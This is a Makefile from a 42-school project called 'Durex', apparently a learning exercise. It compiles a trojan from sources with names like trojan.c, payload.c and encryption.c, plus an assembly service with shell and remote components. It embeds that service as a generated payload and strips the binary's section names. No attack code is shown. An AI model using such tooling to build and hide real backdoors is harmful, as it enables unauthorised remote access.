# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    Makefile                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: alagroy- <alagroy-@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2021/04/23 13:46:17 by alagroy-          #+#    #+#              #
#    Updated: 2021/12/06 10:48:39 by alagroy-         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

NAME = Durex

CC = gcc
NASM = /usr/bin/nasm
CFLAGS = -Wall -Werror -Wextra #-g -fsanitize=address
CFLAGS += $(addprefix -I , $(INCLUDES))

INCLUDES_DIR = ./includes/
SRCS_DIR = ./srcs/
INCLUDES = $(INCLUDES_DIR)
OBJS_DIR = ./.objs/

SRC_FILES = main.c decryption.c encryption.c payload.c trojan.c
OBJ_FILES = $(SRC_FILES:.c=.o)
OBJS = $(addprefix $(OBJS_DIR), $(OBJ_FILES))
SRC_SERVICE = service.s server.s auth.s shell.s remote.s
SRCS_SERVICE = $(addprefix $(SRCS_DIR), $(SRC_SERVICE))
OBJ_SERVICE = $(SRC_SERVICE:.s=.o)
OBJS_SERVICE = $(addprefix $(OBJS_DIR), $(OBJ_SERVICE))
HEADERS = $(INCLUDES_DIR)durex.h

all: $(OBJS_DIR) $(NAME)

$(NAME): $(SRCS_DIR)/payload.c make_objs $(OBJS)
	$(CC) $(CFLAGS) -o $@ $(OBJS)
	strip -s --remove-section=".comment,.shstrtab" Durex -o Durex
	printf "\n\033[0;32m[$(NAME)] Linking [OK]\n\033[0;0m"

service: $(OBJS_SERVICE) Makefile
	ld -o service $(OBJS_SERVICE)
	printf "\n\033[0;32m[service] Linking [OK]\n\033[0;0m"

$(OBJS_DIR)%.o: $(SRCS_DIR)%.c $(HEADERS) Makefile
	$(CC) $(CFLAGS) -o $@ -c $<
	printf "\033[0;32m[$(NAME)] Compilation [$<]                 \r\033[0m"

$(OBJS_DIR)%.o: $(SRCS_DIR)%.s Makefile
	$(NASM) -f elf64 -o $@ $<
	printf "\033[0;32m[$(NAME)] Compilation [$<]                 \r\033[0m"

$(SRCS_DIR)/payload.c: tiny_service Makefile ./scripts/generate_payload.py
	./scripts/generate_payload.py

tiny_service: $(SRCS_SERVICE)
	./scripts/tiny.py $(SRCS_SERVICE)
	printf "\033[0;32m[service] Tinying [OK]\n\033[0;0m"
	$(NASM) -f bin -o tiny_service $(SRCS_DIR)tiny.s
	chmod +x $@
	printf "\033[0;32m[service] Tiny compiled [OK]\n\033[0;0m"

make_objs:
	make --no-print-directory $(OBJS)

$(OBJS_DIR):
	mkdir -p $@

clean:
	$(RM) -Rf $(OBJS_DIR)
	$(RM) $(SRCS_DIR)/payload.c
	$(RM) $(SRCS_DIR)/tiny.s
	$(RM) tiny_service
	printf "\033[0;31m[$(NAME)] Clean [OK]\n"

fclean: clean
	$(RM) $(NAME)
	printf "\033[0;31m[$(NAME)] Fclean [OK]\n"

re: fclean all

.PHONY: clean re fclean all
.SILENT:
